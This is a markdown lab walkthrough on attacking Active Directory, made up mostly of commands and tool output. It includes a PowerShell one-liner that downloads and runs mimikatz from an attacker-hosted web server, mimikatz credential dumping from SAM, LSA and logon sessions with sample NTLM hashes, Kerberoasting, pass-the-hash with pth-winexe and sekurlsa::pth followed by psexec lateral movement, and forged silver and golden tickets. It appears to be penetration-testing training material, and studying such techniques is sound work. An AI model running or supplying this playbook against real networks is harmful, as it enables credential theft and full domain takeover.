# Attacking Active Directory
## Lab Environment
|Server|IP Address|OS|Function|
|---|---|---|---|
|dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
|svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|

# Cached Credential Storage and Retrieval
**On Kali**: Setup web server to host `mimikatz`
```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```
**On Target**: Download and run `mimikatz`
- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Start-Process`
```console
powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
```
**On Target**: mimikatz commands
- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

- ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:
```console

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM


mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa /patch
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

mimikatz #
```

- Successful `lsadump::sam` example:
```console
mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
Local SID : S-1-5-21-1540030335-1244868743-683777651

SAMKey : 3e3e9d70bd634ed43edbe5548d50e40e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e4eff03c20be1cf228acad5ae9dffa

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-GKEGHIVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 56498ceffdf35f16cffb36744b2f98f76955058b3918c827e173fc7aa401f31f
      aes128_hmac       (4096) : 1f052f941e6b84ff8df58a0157dd7b25
      des_cbc_md5       (4096) : d5612916b59bad51

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-GKEGHIVAdministrator
    Credentials
      des_cbc_md5       : d5612916b59bad51


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5a2b1b78290d381def497905d467fcff

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b848a29d177ddaf268c55ff8b0a27e40

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fd924dec8a07c294a448fe64a59d6253b11700fd8b9ba0b04914baca366adee8
      aes128_hmac       (4096) : a09548edf5d6ef88615586ad4315d147
      des_cbc_md5       (4096) : 982a37cb1998d66e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 982a37cb1998d66e


RID  : 000003eb (1003)
User : localadmin
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 16c96a30f045654ca0f5277d816dc3fc
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 35807c03d79f70538886cc1f45212e9c

* Primary:Kerberos-Newer-Keys *
    Default Salt : CLIENT.LAB.VXlocaladmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0cbf515a0f766032f6c3d226bebbb2de3ff3252c0107d545839a11da9ea0d723
      aes128_hmac       (4096) : 4541dc99ef9a196bfa67fdb81098a8e3
      des_cbc_md5       (4096) : ecd6e0d6237ca19e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : CLIENT.LAB.VXlocaladmin
    Credentials
      des_cbc_md5       : ecd6e0d6237ca19e
```

- Successful `lsadump::lsa /patch` example:
```console
mimikatz # lsadump::lsa /patch
Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003eb (1003)
User : localadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 5a2b1b78290d381def497905d467fcff
```

- Successful `sekurlsa::logonpasswords` example:
```console
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7831562 (00000000:0077800a)
Session           : Interactive from 0
User Name         : mike
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 9:13:04 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1105
        msv :
         [00000003] Primary
         * Username : mike
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
        tspkg :
        wdigest :
         * Username : mike
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : mike
         * Domain   : LAB.VX
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3508055 (00000000:00358757)
Session           : Interactive from 1
User Name         : domainadmin
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 8:48:56 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1104
        msv :
         [00000003] Primary
         * Username : domainadmin
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
        tspkg :
        wdigest :
         * Username : domainadmin
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : domainadmin
         * Domain   : LAB.VX
         * Password : (null)
        ssp :
        credman :
        cloudap :

••• OUTPUT TRUNCATED •••
```

# Service Account Attack (Kerberoasting)
```console
kerberos::list /export
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

# Pass the Hash

☝️ **Note**: LM hashes are not used from Windows 10 onwards, string of 32 zeros can used to fill the LM hash portion of the pth-winexe command

## pth-winexe
- Domain account
```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\domainadmin

C:\Windows\system32>hostname
hostname
SVR
```
- Local account
```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
svr\administrator

C:\Windows\system32>hostname
hostname
SVR
```
## mimikatz - sekurlsa::pth
### Domain account
- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
- The `sekurlsa::pth` will spawn a new cmd window
```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : domainadmin
domain  : lab.vx
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
  |  PID  2536
  |  TID  7400
  |  LSA Process is now R/W
  |  LUID 0 ; 10105231 (00000000:009a318f)
  \_ msv1_0   - data copy @ 00000129DC857510 : OK !
  \_ kerberos - data copy @ 00000129DC9DA8C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000129DC9D00E8 (32) -> null
```
- Connect to the target machine in the new cmd window
```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\dc cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\domainadmin

C:\Windows\system32>hostname
DC
```
### Local account
- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option
```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : administrator
domain  : *
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
  |  PID  6872
  |  TID  5672
  |  LSA Process was already R/W
  |  LUID 0 ; 13220694 (00000000:00c9bb56)
  \_ msv1_0   - data copy @ 00000129DC9C5AB0 : OK !
  \_ kerberos - data copy @ 00000129DC9D8288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000129DBEE4128 (32) -> null
```
- Connect to the target machine in the new cmd window
- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd
```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\svr cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
svr\administrator

C:\Windows\system32>hostname
SVR
```

# Silver Ticket
```console
kerberos::purge
kerberos::list
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
kerberos::list
```

# Golden Ticket
```console
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd
psexec.exe \\dc01 cmd.exe
```
